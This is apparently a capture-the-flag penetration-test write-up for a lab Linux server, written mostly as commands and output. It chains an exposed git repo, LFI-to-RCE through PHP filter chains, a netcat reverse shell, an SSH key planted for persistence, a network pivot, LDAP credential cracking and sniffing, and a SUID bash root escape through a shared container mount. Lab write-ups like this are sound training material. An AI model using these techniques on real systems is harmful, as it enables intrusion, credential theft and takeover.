# Lab description
You’ve been brought in to conduct an internal penetration test targeting a highly sensitive Linux server. To demonstrate the real-world business impact of a breach, the client has hidden two flags on the system. Your objective: compromise the server and extract both flags.

The client has provided you with VPN access to their environment, but no other information.

# Enumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT -Pn 10.0.20.19 -vv

Nmap scan report for 10.0.20.19
Host is up, received user-set (0.096s latency).
Scanned at 2026-10-08 18:05:45 BST for 65s
Not shown: 65486 filtered tcp ports (no-response)
PORT      STATE  SERVICE REASON
21/tcp    open   ftp     syn-ack
22/tcp    open   ssh     syn-ack
80/tcp    open   http    syn-ack
```

## Nmap
```python
❯❯❯ nmap -p 21,22,80 -A --min-rate=2000 -sT -Pn 10.0.20.19
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-08 18:10 +0100
Nmap scan report for traverse.hsm (10.0.20.19)
Host is up (0.096s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.0.0.247
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 ftp      ftp          4096 Sep 22 07:49 devops
|_-rw-rw-r--    1 ftp      ftp       3507597 Jun 20  2022 mountains-wallpaper-photo.jpg
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 36:47:04:4c:08:64:cf:fa:8f:e5:f2:18:6b:d1:c1:06 (ECDSA)
|_  256 8a:5d:e3:13:e6:f8:6d:d5:31:5a:90:ef:22:13:14:ab (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Traverse Outdoor Equipment
|_http-server-header: nginx/1.24.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Crestron XPanel control system (86%), Linux 2.6.32 - 3.13 (86%), Linux 3.2 - 4.14 (86%), Linux 4.15 - 5.19 (86%), Android 10 - 12 (Linux 4.14 - 4.19) (86%), Linux 2.6.32 - 3.10 (85%), Linux 4.15 (85%), HP P2000 G3 NAS device (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

# SSH (22)
## Version info
```python
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 36:47:04:4c:08:64:cf:fa:8f:e5:f2:18:6b:d1:c1:06 (ECDSA)
|_  256 8a:5d:e3:13:e6:f8:6d:d5:31:5a:90:ef:22:13:14:ab (ED25519)
```

## Auth method
```python
❯❯❯ ssh root@traverse.hsm
The authenticity of host 'traverse.hsm (10.0.20.19)' can't be established.
ED25519 key fingerprint is: SHA256:489rvDc5Uk/oTQm9cDzL+Q0f72XioVYVvKpJAvGyDP8
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'traverse.hsm' (ED25519) to the list of known hosts.
root@traverse.hsm: Permission denied (publickey).
```

Key based auth, more secure

# FTP (21)

As seen from nmap, anonymous login is enabled

```python
❯❯❯ ftp traverse.hsm                                              
Connected to traverse.hsm.
220 (vsFTPd 3.0.5)
Name (traverse.hsm:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||30022|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Sep 22 07:49 devops
-rw-rw-r--    1 ftp      ftp       3507597 Jun 20  2022 mountains-wallpaper-photo.jpg
226 Directory send OK.
ftp> 
```

```python
ftp> put test.txt
local: test.txt remote: test.txt
229 Entering Extended Passive Mode (|||30030|)
550 Permission denied.
ftp> 
```

I cannot write to it

```python
ftp> binary
200 Switching to Binary mode.
ftp> mget *
mget devops [anpqy?]? y
229 Entering Extended Passive Mode (|||30086|)
550 Failed to open file.
mget mountains-wallpaper-photo.jpg [anpqy?]? y
229 Entering Extended Passive Mode (|||30005|)
150 Opening BINARY mode data connection for mountains-wallpaper-photo.jpg (3507597 bytes).
100% |*****************************************************************|  3425 KiB    4.10 MiB/s    00:00 ETA
226 Transfer complete.
3507597 bytes received in 00:00 (3.67 MiB/s)
ftp> 
```

Ill download the full contents in binary mode to avoid things like file corruption

The image has nothing visible on it, nor nothing in the metadata

```python
ftp> get content.zip
local: content.zip remote: content.zip
229 Entering Extended Passive Mode (|||30100|)
150 Opening BINARY mode data connection for content.zip (829 bytes).
100% |*****************************************************************|   829        1.47 MiB/s    00:00 ETA
226 Transfer complete.
829 bytes received in 00:00 (8.44 KiB/s)
ftp> 
```

There is also a zip file here ill download

```python
❯❯❯ unzip content.zip 
Archive:  content.zip
[content.zip] message.eml password: 
```

It requires a password to unzip

```python
❯❯❯ zip2john content.zip > zip.hash 

❯❯❯ hashcat zip.hash /usr/share/wordlists/rockyou.txt --user -m 17220

$pkzip$2*1*1*0*8*24*8c80*ed201a0ee956594825e6b82d805328024fbb3032742ad247e65fd829dadf9153a1d9d38a*2*0*de*116*243d0d6e*0*45*8*de*3e2b*378566d3d8a1d23aa37518e6b8471fe5637db20a636a69a92c49e03b899e85cac1797f9fe60e3de6d4b88d5e2762ec56a6843fac795952d44501b619c5215b41493a93a8285e86da522d67d27fa40cbf5804515d002197d40841bc927e0a5c7f215075ea956848be895bfde79fcc038f0e3133094ba7a73a50e9cb52b5d46ef58b923afd9612f295f84c43ae665ca36f29323064eb1e5e167d4c797e14407b42d09722cc53799be71c131d2d7e1ca1b447b83f743a26c31734175ed2a862377c6dadc5a46e5b0b1d48e36f5a48bb10defac338139a0d0e59d7ab0b96e5be*$/pkzip$:mountaineers
```

The hash cracked so i should be able to unzip it

```python
❯❯❯ unzip content.zip 
Archive:  content.zip
[content.zip] message.eml password: 
  inflating: message.eml             
  inflating: traverse.conf
```

Now i can look at these files

```python
❯❯❯ cat message.eml 
From: spencer@traverse.hsm
To: devops@traverse.hsm
Subject: Repository status
Date: Mon, 13 Apr 2026 17:30:00 +0000
Content-Type: text/plain; charset="UTF-8"

The repository in /opt/app has been initialized.

--
Spencer Tomkins
Senior DevOps Engineer
Traverse Outdoor Equipment
```

A reference to a repo? 

Also two possible users found

```python
❯❯❯ cat traverse.conf 
server {
    listen 80 default_server;
    listen [::]:80 default_server;
    server_name _;
    return 301 http://traverse.hsm$request_uri;
}

server {
    listen 80;
    listen [::]:80;
    server_name traverse.hsm;

    root /var/www/html;
    index index.html;

    location / {
        proxy_pass http://127.0.0.1:8000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }

    location /assets {
        alias /opt/app/static/;
    }
}
```

Nothing too interesting here

# HTTP (80)

![1016](Pasted%20image%2020261008182819.png)

## Nuclei
```python
❯❯❯ nuclei -u http://traverse.hsm/ 

[git-config-nginxoffbyslash] [http] [medium] http://traverse.hsm//assets../.git/config [paths="/assets../.git/config"]

...[SNIP]...
```

![](Pasted%20image%2020261008194729.png)

This clearly shows the git repo from earlier

# Enumeration of git repo

https://github.com/arthaud/git-dumper

I can use this tool to download all the file from this repo

```python
❯❯❯ git-dumper http://traverse.hsm//assets../.git/ git-dump 
```

This has downloaded some files, some were found to be 404 but some returned 200s

```python
❯❯❯ git log --all --oneline                                          
d708e3e (HEAD -> master) Document web deployment workflow
cff44e1 Move environment credentials to deployment
539a855 Initialize Traverse web repository
```

There is three commits, the second one looks the most interesting

```python
git show cff44e1
commit cff44e123f6eca9a71e4c0cc98b13f9df64caad2
Author: Spencer Tomkins <spencer@traverse.hsm>
Date:   Mon Apr 13 18:06:00 2026 +0000

    Move environment credentials to deployment

diff --git a/.gitignore b/.gitignore
new file mode 100644
index 0000000..3b9d9f1
--- /dev/null
+++ b/.gitignore
@@ -0,0 +1,5 @@
+*.env
+.env
+.DS_Store
+deploy/environments/*.env
+!deploy/environments/*.env.example
diff --git a/deploy/environments/docs-development.env b/deploy/environments/docs-development.env.example
similarity index 64%
rename from deploy/environments/docs-development.env
rename to deploy/environments/docs-development.env.example
index 3e53430..ab131a5 100644
--- a/deploy/environments/docs-development.env
+++ b/deploy/environments/docs-development.env.example
@@ -1,5 +1,5 @@
 DOCS_ENV=development
 DOCS_BASE_URL=http://docs-0eoyfsyajxs.traverse.hsm
-DOCS_USERNAME=spencer
-DOCS_PASSWORD=RidgeLine!2026
+DOCS_USERNAME=
+DOCS_PASSWORD=
 DOCS_RENDERER=legacy
```

Found some credentials and a subdomain, these creds wont work on SSH becuase SSH does not allow password based auth

# `docs-0eoyfsyajxs.traverse.hsm` subdomain

![901](Pasted%20image%2020261008195851.png)

Found a login form

The credentials may work here

![716](Pasted%20image%2020261008200115.png)

The credentials do get me access

![](Pasted%20image%2020261008200622.png)

The pages use an interesting URL parameter, looks like it could be vulnerable to some form of path traversal

![](Pasted%20image%2020261008203547.png)

Ill continue to test path traversal, i see its not blocking `../` through a blacklist

It doesnt looks like i can escape the `pages/` directory by normal means

![](Pasted%20image%2020261008204212.png)

However it does look like i can use PHP filters

# LFI to RCE

https://github.com/synacktiv/php_filter_chain_generator

```python
❯❯❯ python3 php_filter_chain_generator.py --chain '<?=system($_GET[0]);?>'
```

This will inject the `0` as a parameter

Ill then use this in the URL inside the `?page=` parameter i can then use `&0=` to get code execution

![](Pasted%20image%2020261008212800.png)

# Reverse shell

```python
❯❯❯ penelope -p 1337         
[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.86.128 • 10.200.105.173
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

Ill start the listener

![](Pasted%20image%2020261008212946.png)

The system has netcat as well as busybox

![](Pasted%20image%2020261008213934.png)

```python
busybox nc 10.200.105.173 1337 -e /bin/bash
```

Ill place this inside 0 using the same php filter value, then apply some URL encoding to the nc shell

Then  i get a shell

```python
traverse-docs@ip-10-0-20-19:~$ ls -al /home/
total 16
drwxr-xr-x  4 root    root    4096 Apr 13 17:09 .
drwxr-xr-x 22 root    root    4096 Oct  8 17:03 ..
drwxr-x---  4 spencer spencer 4096 Sep 22 07:41 spencer
drwxr-x---  5 ubuntu  ubuntu  4096 Apr 15 02:37 ubuntu
traverse-docs@ip-10-0-20-19:~$ 
```

There are two users on here

# Access as `spencer`

```python
traverse-docs@ip-10-0-20-19:/$ su spencer
Password: 
spencer@ip-10-0-20-19:/$ 
```

Ill try the password i found in the git dump from earlier and i get access

![](Pasted%20image%2020261008214727.png)

I can get the user flag

```python
spencer@ip-10-0-20-19:~$ cat notes.txt 
Note to self:

Docker container running the management dashboard on the 172.20.0.0/24 network for nyc-pweb03 system. After final testing I should move this out to prod officially.
spencer@ip-10-0-20-19:~$ 
```

Looks like there is another connected machine here

```python
spencer@ip-10-0-20-19:~/.ssh$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILuuc9ATXHZHzfDtAGfyx8CYDisCFp75E/floQfhjq4J kali@kali' >> authorized_keys 
spencer@ip-10-0-20-19:~/.ssh$
```

Ill echo my public key into `authorizes_keys` inside an `.ssh` dir i made so i can get access over SSH

```python
❯❯❯ ssh spencer@traverse.hsm -i /home/kali/.ssh/id_ed25519 
Welcome to Ubuntu 24.04.5 LTS (GNU/Linux 7.0.0-1012-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri Oct  9 15:53:22 UTC 2026

  System load:  0.0               Temperature:           -273.1 C
  Usage of /:   73.7% of 6.71GB   Processes:             142
  Memory usage: 19%               Users logged in:       0
  Swap usage:   0%                IPv4 address for ens5: 10.0.20.19


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

4 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Sep 22 08:01:08 2026 from 10.0.0.247
spencer@ip-10-0-20-19:~$
```

Then using the corresponding private key i can log in via SSH to get a more stable session

```python
spencer@ip-10-0-20-19:~$ ifconfig
br-b601360b6ecb: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.20.0.1  netmask 255.255.255.0  broadcast 172.20.0.255
        inet6 fe80::caf:4eff:fe40:b600  prefixlen 64  scopeid 0x20<link>
        ether 0e:af:4e:40:b6:00  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

This is the interface the notes file was talking about

# Setting up ligolo-ng to access internal host

```python
❯❯❯ sudo ./proxy -selfcert  
[sudo] password for kali: 
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] daemon configuration file not found. Creating a new one... 
? Enable Ligolo-ng WebUI? No
WARN[0001] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
ERRO[0001] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
INFO[0001] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: 0.9.2

ligolo-ng »  
```

Ill start by starting the proxy on my host

```python
❯❯❯ scp agent -i /home/kali/.ssh/id_ed25519 spencer@traverse.hsm:/tmp
```

Ill then transfer the agent to the target

```python
spencer@ip-10-0-20-19:/tmp$ chmod +x agent 
spencer@ip-10-0-20-19:/tmp$ ./agent -connect 10.200.105.173:11601 --retry --ignore-cert                      
WARN[0000] warning, certificate validation disabled     
INFO[0000] Connection established                        addr="10.200.105.173:11601"
```

Then ill trigger the connection on the target

```python
ligolo-ng » INFO[0249] Agent joined.                                 id=02ffd2b701c9 name=spencer@ip-10-0-20-19 remote="10.0.20.19:46766"
ligolo-ng » 
ligolo-ng » 
ligolo-ng » session
? Specify a session : 1 - spencer@ip-10-0-20-19 - 10.0.20.19:46766 - 02ffd2b701c9
[Agent : spencer@ip-10-0-20-19] » 
[Agent : spencer@ip-10-0-20-19] » 
[Agent : spencer@ip-10-0-20-19] » ifcreate --name ligolo
INFO[0266] Creating a new ligolo interface...           
INFO[0266] Interface created!                           
[Agent : spencer@ip-10-0-20-19] » route_add --name ligolo --route 172.20.0.0/24
INFO[0317] Route created.                               
[Agent : spencer@ip-10-0-20-19] » tunnel_start 
INFO[0321] Starting tunnel to spencer@ip-10-0-20-19 (02ffd2b701c9) 
[Agent : spencer@ip-10-0-20-19] » 
```

Then ill use the session create a new interface and add the routing info give in the notes file then start the tunnel 

# Internal host enumeration

```python
❯❯❯ nmap -sn 172.20.0.0/24
```

Ill do a host discovery scan in nmap to find live hosts, it comes back as they are all alive, but based on latency it looks like `.0.10` is the only alive one

```python
❯❯❯ nmap -p- --min-rate=100 -sT -Pn 172.20.0.10 -vv

Nmap scan report for 172.20.0.10
Host is up, received user-set (0.095s latency).
Scanned at 2026-10-09 17:14:54 BST for 450s
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack
8080/tcp open  http-proxy syn-ack
```

Ill then scan that host to see the open ports

## SSH (22)

```python
❯❯❯ ssh root@172.20.0.10                                             
The authenticity of host '172.20.0.10 (172.20.0.10)' can't be established.
ED25519 key fingerprint is: SHA256:FjvEofK7rGUbr1TH/yLGUF4esW2DAJ54wJfhkCjvs20
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.20.0.10' (ED25519) to the list of known hosts.
root@172.20.0.10's password:
```

There is password based auth on here

## HTTP (8080)

![686](Pasted%20image%2020261009172344.png)

![](Pasted%20image%2020261009172457.png)

It looks to be a flask app

Its also interesting itd trying to login with LDAP

```python
spencer@ip-10-0-20-19:~$ ss -tulnp
Netid     State      Recv-Q     Send-Q           Local Address:Port         Peer Address:Port     Process     
udp       UNCONN     0          0                   127.0.0.54:53                0.0.0.0:*                    
udp       UNCONN     0          0                127.0.0.53%lo:53                0.0.0.0:*                    
udp       UNCONN     0          0              10.0.20.19%ens5:68                0.0.0.0:*                    
udp       UNCONN     0          0                    127.0.0.1:323               0.0.0.0:*                    
udp       UNCONN     0          0                        [::1]:323                  [::]:*                    
tcp       LISTEN     0          4096                   0.0.0.0:22                0.0.0.0:*                    
tcp       LISTEN     0          32                     0.0.0.0:21                0.0.0.0:*                    
tcp       LISTEN     0          511                    0.0.0.0:80                0.0.0.0:*                    
tcp       LISTEN     0          4096                127.0.0.54:53                0.0.0.0:*                    
tcp       LISTEN     0          2048                   0.0.0.0:389               0.0.0.0:*                    
tcp       LISTEN     0          4096             127.0.0.53%lo:53                0.0.0.0:*                    
tcp       LISTEN     0          4096                      [::]:22                   [::]:*                    
tcp       LISTEN     0          511                       [::]:80                   [::]:*                    
spencer@ip-10-0-20-19:~$
```

If i look at the ports on the main host, i do see port 389

I can try running some LDAP enumeration on the host

```python
❯❯❯ ldapsearch -x -H ldap://172.20.0.1 -b "" -s base namingContexts                       
# extended LDIF
#
# LDAPv3
# base <> with scope baseObject
# filter: (objectclass=*)
# requesting: namingContexts 
#

#
dn:
namingContexts: dc=nodomain

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

As seen here its using the naming context `dc=nodomain`

```python
❯❯❯ ldapsearch -x -H ldap://172.20.0.1 -b 'dc=nodomain' '(objectclass=*)'     
# extended LDIF
#
# LDAPv3
# base <dc=nodomain> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# nodomain
dn: dc=nodomain
objectClass: top
objectClass: dcObject
objectClass: organization
o: nodomain
dc: nodomain

# users, nodomain
dn: ou=users,dc=nodomain
objectClass: organizationalUnit
objectClass: top
ou: users

# spencer, users, nodomain
dn: uid=spencer,ou=users,dc=nodomain
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: inetOrgPerson
uid: spencer
cn: Spencer Tomkins
sn: Tomkins
mail: spencer@traverse.hsm
userPassword:: e1NTSEF9d0JNb2dxQUZiUnZkcWJNTUtqNEovalR6YlVQOUtSVkU=

# web_admin, users, nodomain
dn: uid=web_admin,ou=users,dc=nodomain
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: inetOrgPerson
uid: spencer
uid: web_admin
cn:: V2ViIA==
sn: Administrator
mail: webadmin@traverse.hsm
userPassword:: e1NTSEF9RVZCKzBBblVyRGc4T3Q4c2JOdFUrdzBqME1keXRqWEY=

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 4
```

Then ill apply what i know from the last command to make a query

I see there is two user passwords, one for spencer and one for web_admin

```python
❯❯❯ echo 'e1NTSEF9d0JNb2dxQUZiUnZkcWJNTUtqNEovalR6YlVQOUtSVkU=' | base64 -d
{SSHA}wBMogqAFbRvdqbMMKj4J/jTzbUP9KRVE

❯❯❯ echo 'e1NTSEF9RVZCKzBBblVyRGc4T3Q4c2JOdFUrdzBqME1keXRqWEY=' | base64 -d
{SSHA}EVB+0AnUrDg8Ot8sbNtU+w0j0MdytjX
```

These looks like two LDAP password hashes, this type of hash uses a salted SHA-1 algorithm

```python
❯❯❯ hashcat '{SSHA}EVB+0AnUrDg8Ot8sbNtU+w0j0MdytjXF' /usr/share/wordlists/rockyou.txt

{SSHA}EVB+0AnUrDg8Ot8sbNtU+w0j0MdytjXF:traverse15
```

The one for spencer failed to crack, but the web_admin one cracked

I can try to use this to logon to the management panel

# Access to the management dashboard (`172.20.0.10:8080`)

![857](Pasted%20image%2020261009174500.png)

This got me access to the admin panel

The only feature on the page is a LDAP status button, after pressing it says im authenticated as `cn=admin,dc=nodomain`

It may be possible to see the traffic its passing when this button is clicked since i have CLI access on that host where LDAP is also running

# Capturing LDAP traffic to get credentials

```python
❯❯❯ ssh spencer@traverse.hsm -i /home/kali/.ssh/id_ed25519
```

First ill open up another session on the main host as `spencer`

```python
spencer@ip-10-0-20-19:~$ tcpdump -i any port 389 -v -n -A
tcpdump: data link type LINUX_SLL2
tcpdump: listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes
```

Then ill listen for traffic

Then ill press the button again

```python
.....h.j0,..#`'.....cn=admin,dc=nodomain..20_M4m@m+-Y~
17:00:37.479770 br-b601360b6ecb In  IP (tos 0x0, ttl 64, id 21592, offset 0, flags [DF], proto TCP (6), length 98)
    172.20.0.10.38751 > 172.20.0.1.389: Flags [P.], cksum 0x5888 (incorrect -> 0xbbe5), seq 1:47, ack 1, win 251, options [nop,nop,TS val 3751808428 ecr 3479741290], length 46
E..bTX@.@..
```

Then i can see the credentials passed on the top line in the snippet

```python
admin:20_M4m@m+-Y~
```

Ill try these creds on SSH on the `0.10` host

# SSH access as `admin` on `172.20.0.10`

```python
❯❯❯ ssh admin@172.20.0.10                                 
admin@172.20.0.10's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 7.0.0-1012-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Wed Apr 15 18:34:46 2026 from 172.20.0.1
admin@nyc-pweb03:~$ 
```

And i have access as this user

# Root access on `172.20.0.10`

```python
admin@nyc-pweb03:~$ sudo -l
[sudo] password for admin: 
Matching Defaults entries for admin on nyc-pweb03:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User admin may run the following commands on nyc-pweb03:
    (ALL) ALL
admin@nyc-pweb03:~$ 
```

This use has full sudo rights

```python
admin@nyc-pweb03:~$ sudo su 
root@nyc-pweb03:/home/admin# 
```

This means i can just switch user to root

# Full root access

```python
root@nyc-pweb03:/mnt/share# touch test                                                                       
root@nyc-pweb03:/mnt/share# ls -la
total 8
drwxr-xr-x 2 root root 4096 Oct  9 17:12 .
drwxr-xr-x 1 root root 4096 Apr 15 04:51 ..
-rw-r--r-- 1 root root    0 Oct  9 17:12 test
root@nyc-pweb03:/mnt/share# echo 'test' >> test
root@nyc-pweb03:/mnt/share# 
```

After going into `mnt` there is an interesting share

```python
spencer@ip-10-0-20-19:~$ find / -type f -name 'test' 2>/dev/null
/var/share/test
```

Just as i though this is where the file systems cross each other

```python
spencer@ip-10-0-20-19:/var/share$ ls -la
total 12
drwxr-xr-x  2 root root 4096 Oct  9 17:12 .
drwxr-xr-x 15 root root 4096 Apr 15 04:40 ..
-rw-r--r--  1 root root    5 Oct  9 17:12 test
spencer@ip-10-0-20-19:/var/share$
```

This is the file i placed in `/mnt/share` on the docker container

```python
root@nyc-pweb03:/mnt/share# cp /bin/bash rootbash
root@nyc-pweb03:/mnt/share# chmod 4755 rootbash 
```

So now on the docker contained ill copy `/bin/bash` to into rootbash in the current dir, then give all users full permissions on it

```python
spencer@ip-10-0-20-19:/var/share$ ls -al
total 1376
drwxr-xr-x  2 root root    4096 Oct  9 17:22 .
drwxr-xr-x 15 root root    4096 Apr 15 04:40 ..
-rwsr-xr-x  1 root root 1396520 Oct  9 17:22 rootbash
-rw-r--r--  1 root root       5 Oct  9 17:12 test
spencer@ip-10-0-20-19:/var/share$ 
```

Now the file has full permissions, i should be able to execute it

```python
spencer@ip-10-0-20-19:/var/share$ /var/share/rootbash -p
rootbash-5.1# whoami
root
rootbash-5.1#
```

Now i can use it to become root

![](Pasted%20image%2020261009182528.png)

Then i can get the root fla








